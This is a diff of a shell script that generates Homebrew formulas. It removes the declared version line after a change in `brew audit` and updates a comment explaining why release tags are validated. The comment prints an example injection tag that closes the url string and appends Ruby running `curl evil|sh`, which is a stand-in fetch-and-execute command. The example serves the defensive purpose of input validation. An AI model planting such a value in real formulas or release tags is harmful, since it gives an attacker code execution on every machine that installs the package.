@@ -292,11 +292,15 @@ render_product() { # $1=table entry
 	#
 	# A tag of the form
 	#
-	#     v1.0.0"\n  def self.x; system("curl evil|sh"); end\n  version "1.0.0
+	#     v1.0.0/x"\n  def self.x; system("curl evil|sh"); end\n  url "http://a
 	#
-	# closes the version string and appends Ruby that runs on every
-	# `brew install`. Whoever can publish a release in a product repository would
-	# get code execution on every machine installing from this tap.
+	# closes the url string and appends Ruby that runs on every `brew install`.
+	# Whoever can publish a release in a product repository would get code
+	# execution on every machine installing from this tap. The url is the
+	# surface because the tag lands in `$base`; it used to be the `version`
+	# line as well, which the render dropped when Homebrew started refusing a
+	# declared version as redundant, and one interpolation site is as good as
+	# two for this.
 	#
 	# So the version is held to the same standard as the digest: a fixed
 	# character set, checked before it is interpolated. Real tags are v5.1.0,
@@ -385,6 +389,19 @@ render_product() { # $1=table entry
     bin.install asset => \"$formula\""
 	fi
 
+	# No `version` line. Homebrew scans the version out of the url, and on
+	# 2026-09-06 `brew audit --strict` began refusing the declared one as
+	# redundant with it: run 34009004969 reported `Stable: version 5.9.1 is
+	# redundant with version scanned from URL` over a formula whose generator
+	# had not changed since it passed on 2026-09-02 (run 33635857150). The
+	# version still reaches the formula, through the tag in every url, and the
+	# `$version` variable below still gates and reports the render.
+	#
+	# What that leaves depending on Homebrew: the scan has to keep reading
+	# `.../releases/download/v<version>/<asset>` as <version>. The audit
+	# message is the evidence that it does, since the rule only fires when the
+	# scanned version EQUALS the declared one, and the `brew audit` job is what
+	# reads it on every pull request and on the daily run against `main`.
 	cat >"$root/Formula/$formula.rb" <<RB
 # typed: false
 # frozen_string_literal: true
@@ -394,7 +411,6 @@ render_product() { # $1=table entry
 class $cls < Formula
   desc "$desc"
   homepage "https://github.com/$repo"
-  version "$version"
   license "$licence"
 
 $os_blocks
